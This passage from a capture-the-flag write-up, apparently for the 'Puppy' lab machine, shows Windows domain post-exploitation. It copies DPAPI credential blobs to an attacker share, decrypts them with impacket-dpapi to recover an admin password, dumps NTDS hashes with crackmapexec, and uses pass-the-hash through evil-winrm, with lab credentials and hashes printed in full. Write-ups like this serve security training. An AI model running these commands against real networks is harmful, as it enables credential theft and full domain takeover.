*Evil-WinRM* PS C:\Users\steph.cooper\Appdata\Roaming\Microsoft\Credentials> copy C8D69EBE9A43E9DEBF6B5FBD48B521B9 "\<IP>\share\steph-credential"
*Evil-WinRM* PS C:\Users\steph.cooper\Appdata\Roaming\Microsoft\Credentials>
```

<p class="indent-paragraph">
After identifying two DPAPI-related blobs under <code>C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect</code> (the <code>masterkey blob</code>) and <code>Microsoft\Credentials</code> (the <code>credential blob</code>), we initiated a decryption process. These binary blobs store sensitive user data encrypted using Windows Data Protection API (DPAPI), and are commonly extracted in post-exploitation scenarios to retrieve secrets such as saved passwords and tokens.
</p>

<p class="indent-paragraph">
The<code>masterkey blob</code> was decrypted using the cleartext password of the<code>steph.cooper</code> user alongside their SID. The resulting key was then used to decrypt the<code>credential blob</code><span class="codefix">.</span> This was executed in a single chained command:
</p>

<pre><code>~$ key=$(impacket-dpapi masterkey -f steph-masterkey -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!' | grep 'Decrypted key:' | awk '{print $3}'); echo "\n[*] Decrypted MasterKey: $key\n"; impacket-dpapi credential -f steph-credential -key $key</code></pre>

<p class="indent-paragraph">
The decrypted output revealed a new set of credentials in plaintext:<code>steph.cooper_adm</code> with the password<code>FivethChipOnItsWay2025!</code><span class="codefix">.</span> This account appears to hold elevated privileges within the domain and will be leveraged in the next stage for privilege escalation or domain compromise.
</p>

```
[*] Decrypted MasterKey: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

### 🛡️ Domain Replication Attack with DRSUAPI


<p class="indent-paragraph">
It is worth noting that such credentials can be silently stored by the system when a privileged account is used via the Windows UAC prompt or through<code>runas /savecred</code><span class="codefix">.</span> In these scenarios, domain administrator credentials may be cached and protected with DPAPI under the standard user’s context. In this case, after extracting and decrypting the DPAPI blobs, we retrieved the plaintext credentials for<code>steph.cooper_adm</code><span class="codefix">.</span> To confirm the privilege level, we authenticated against the domain controller using<code>nxc</code><span class="codefix">,</span> and the<code>(Pwn3d!)</code> indicator verified that the account holds Domain Admin privileges—validating a complete domain compromise.
</p>

```
~$ nxc smb dc.puppy.htb -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'  

SMB         dc.puppy.htb     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         dc.puppy.htb     445    DC               [+] PUPPY.HTB\steph.cooper_adm:FivethChipOnItsWay2025! (Pwn3d!)
```

<p class="indent-paragraph">
With valid domain administrator credentials in hand, the next logical step was to extract the NTDS.dit secrets from the domain controller. This was performed using<code>crackmapexec</code> with the<code>--ntds</code> flag, which allowed for a full dump of user password hashes from Active Directory. It is important to highlight that although tools like<code>netexec</code> (nxc) support similar functionality, attempting an NTDS dump using<code>nxc --ntds</code> on recent Windows Server builds (such as 2019 or 2022) may crash the domain controller. As such,<code>crackmapexec</code> remains the safer and more stable option for this task.
</p>
<p class="indent-paragraph">
The output confirmed full domain compromise, revealing the password hashes for critical accounts, including<code>Administrator</code><span class="codefix">,</span><code>krbtgt</code><span class="codefix">,</span> and all domain users. These hashes are valuable for offline cracking, impersonation, or further lateral movement across trust boundaries. At this point, full control over the domain had been achieved.
</p>

```
~$ crackmapexec smb dc.puppy.htb -u steph.cooper_adm -p 'FivethChipOnItsWay2025!' --ntds

SMB         dc.puppy.htb    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         dc.puppy.htb    445    DC               [+] PUPPY.HTB\steph.cooper_adm:FivethChipOnItsWay2025! (Pwn3d!)
SMB         dc.puppy.htb    445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc.puppy.htb    445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:::
SMB         dc.puppy.htb    445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         dc.puppy.htb    445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a4f2989236a639ef3f766e5fe1aad94a:::
SMB         dc.puppy.htb    445    DC               PUPPY.HTB\levi.james:1103:aad3b435b51404eeaad3b435b51404ee:ff4269fdf7e4a3093995466570f435b8:::
SMB         dc.puppy.htb    445    DC               PUPPY.HTB\ant.edwards:1104:aad3b435b51404eeaad3b435b51404ee:afac881b79a524c8e99d2b34f438058b:::
SMB         dc.puppy.htb    445    DC               PUPPY.HTB\adam.silver:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
SMB         dc.puppy.htb    445    DC               PUPPY.HTB\jamie.williams:1106:aad3b435b51404eeaad3b435b51404ee:bd0b8a08abd5a98a213fc8e3c7fca780:::
SMB         dc.puppy.htb    445    DC               PUPPY.HTB\steph.cooper:1107:aad3b435b51404eeaad3b435b51404ee:b261b5f931285ce8ea01a8613f09200b:::
SMB         dc.puppy.htb    445    DC               PUPPY.HTB\steph.cooper_adm:1111:aad3b435b51404eeaad3b435b51404ee:ccb206409049bc53502039b80f3f1173:::
SMB         dc.puppy.htb    445    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
SMB         dc.puppy.htb    445    DC               [+] Dumped 10 NTDS hashes
```

<p class="indent-paragraph">
With full domain administrator privileges established, we had direct access to all user directories on the system. From this point, two viable paths could be followed to retrieve the<code>root.txt</code> flag. The first involved navigating to<code>C:\Users\Administrator\Desktop</code> using the<code>steph.cooper_adm</code> account, which had sufficient rights to enumerate and read contents from other user folders. Alternatively, we leveraged the Administrator account's NT hash, previously extracted via<code>crackmapexec</code><span class="codefix">,</span> to authenticate using Pass-the-Hash through<code>evil-winrm</code><span class="codefix">,</span> bypassing the need for the cleartext password entirely.
</p>

```
~$ evil-winrm -i dc.puppy.htb -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'  
                                        
Evil-WinRM shell v3.7
                                                                   
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users> dir

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/3/2025   8:26 AM                adam.silver
d-----         3/11/2025   9:14 PM                Administrator
d-----          3/8/2025   8:52 AM                ant.edwards
d-r---         2/19/2025  11:34 AM                Public
d-----          3/8/2025   7:40 AM                steph.cooper
d-----         5/31/2025   7:19 PM                steph.cooper_adm

*Evil-WinRM* PS C:\Users\Administrator> dir

    Directory: C:\Users\Administrator

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         2/19/2025  11:34 AM                3D Objects
d-r---         2/19/2025  11:34 AM                Contacts
d-r---         5/12/2025   7:34 PM                Desktop
d-r---          3/9/2025   8:22 PM                Documents
d-r---         3/23/2025  12:13 AM                Downloads
d-r---         2/19/2025  11:34 AM                Favorites
d-r---         2/19/2025  11:34 AM                Links
d-r---         2/19/2025  11:34 AM                Music
d-r---         2/19/2025  11:34 AM                Pictures
d-r---         2/19/2025  11:34 AM                Saved Games
d-r---         2/19/2025  11:34 AM                Searches
d-r---         2/19/2025  11:34 AM                Videos

*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         5/31/2025   6:33 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
3b13************************ac56

```

```
~$ evil-winrm -i dc.puppy.htb -u Administrator -H 'bb0edc15e49ceb4120c7bd7e6e65d75b'
                                        
Evil-WinRM shell v3.7                                    
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         5/31/2025   6:33 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
3b13************************ac56
```

<p class="indent-paragraph">
This final technique showcases a critical risk in Active Directory environments where NTLM hashes, once exposed, can grant full access without triggering conventional authentication controls. Using the Administrator's hash, we established a new WinRM session and directly accessed the<code>root.txt</code> file, confirming total domain compromise.
</p><br>

</div>